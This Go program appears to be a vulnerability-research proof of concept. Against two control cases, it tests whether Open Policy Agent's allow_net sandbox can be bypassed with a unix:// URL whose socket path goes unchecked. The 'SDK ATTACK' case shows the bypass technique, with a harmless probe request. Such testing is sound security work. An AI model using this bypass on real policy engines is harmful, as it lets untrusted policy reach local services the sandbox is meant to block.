// Embedder path for opa Lead 1: a Go program that evaluates policy under a
// network sandbox expressed with rego.Capabilities(allow_net). This is the
// population the `allow_net` docs describe alongside the CLI, and the one that
// matters most — a service evaluating policy it did not author.
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"

	"github.com/open-policy-agent/opa/v1/ast"
	"github.com/open-policy-agent/opa/v1/rego"
)

func run(label string, allowNet []string, query string) {
	caps := ast.CapabilitiesForThisVersion()
	caps.AllowNet = allowNet
	an, _ := json.Marshal(allowNet)

	r := rego.New(
		rego.Query(query),
		rego.Capabilities(caps),
		rego.StrictBuiltinErrors(true),
	)
	rs, err := r.Eval(context.Background())

	fmt.Printf("---- %s\n", label)
	fmt.Printf("     allow_net = %s\n", an)
	fmt.Printf("     query     = %s\n", query)
	if err != nil {
		fmt.Printf("     ERROR     = %v\n", err)
		return
	}
	if len(rs) == 0 {
		fmt.Printf("     RESULT    = undefined\n")
		return
	}
	b := rs[0].Bindings["resp"]
	m, _ := b.(map[string]interface{})
	fmt.Printf("     status_code = %v\n", m["status_code"])
	fmt.Printf("     raw_body    = %v\n", m["raw_body"])
}

func main() {
	markB := os.Getenv("MARK_B")
	if markB == "" {
		markB = "CVEHUNT-B"
	}
	sock := "%2Fw%2Fprobe.sock"

	// Control: the same unix:// URL with an authority that is not allowed.
	run("SDK CONTROL — authority not in allow_net",
		[]string{"allowed.example.com"},
		fmt.Sprintf(`resp = http.send({"method":"get","url":"unix://notallowed.example.com/%s-SDK-C?socket=%s"})`, markB, sock))

	// Control: allow_net: [] — documented as "NO host can be connected to".
	run("SDK CONTROL — allow_net is empty",
		[]string{},
		fmt.Sprintf(`resp = http.send({"method":"get","url":"unix://allowed.example.com/%s-SDK-C2?socket=%s"})`, markB, sock))

	// Attack: allowed authority, socket path never checked.
	run("SDK ATTACK — allowed authority, disallowed socket destination",
		[]string{"allowed.example.com"},
		fmt.Sprintf(`resp = http.send({"method":"get","url":"unix://allowed.example.com/%s-SDK-A?socket=%s"})`, markB, sock))
}
